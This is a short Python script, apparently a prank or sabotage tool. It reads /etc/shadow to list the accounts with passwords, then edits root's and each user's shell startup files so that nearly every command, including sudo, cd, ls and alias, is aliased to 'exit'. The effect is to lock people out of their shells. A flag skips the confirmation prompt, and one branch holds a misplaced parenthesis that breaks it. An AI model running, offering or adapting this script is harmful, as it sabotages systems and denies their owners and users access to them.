#!/usr/bin/env python

import subprocess
import os
import sys

users = []

namesProcess = subprocess.Popen("sudo awk -F':' '$2 ~ \"\$\" {print $1}' /etc/shadow", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
for line in namesProcess.stdout.readlines():
	users.append(line.rstrip('\n'))

def appendAliases(aliasesfolder):
	with open(aliasesfolder, "a") as myfile:
		aliasesProcess = subprocess.Popen("{ ls /bin; ls /usr/bin; } | sort", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
		for line in aliasesProcess.stdout.readlines():
			myfile.write("alias " + line.rstrip('\n') + "=\'exit\'\n")
		myfile.write("alias sudo='exit'\n")
		myfile.write("alias cd='exit'\n")
		myfile.write("alias ls='exit'\n")
		myfile.write("alias alias='exit'\n")


if len(sys.argv) == 1:
	userinput = raw_input("You sure?")
	if userinput == 'yes':
		appendAliases("/root/.aliases")
		os.system("echo source /root/.aliases >> /root/.bashrc")
		
		for user in users:
			appendAliases("/home/" + user + "/.aliases")
			os.system("echo source " + "/home/" + user + "/.aliases >> /home/" + user + "/.bashrc")
	else:
		print "That's a no."
elif len(sys.argv == 2 and sys.argv[1] == '-y'):
		appendAliases("/root/.aliases")
		os.system("echo source /root/.aliases >> /root/.bashrc")
		
		for user in users:
			appendAliases("/home/" + user + "/.aliases")
			os.system("echo source " + "/home/" + user + "/.aliases >> /home/" + user + "/.bashrc")
else:
	print "Saving youself"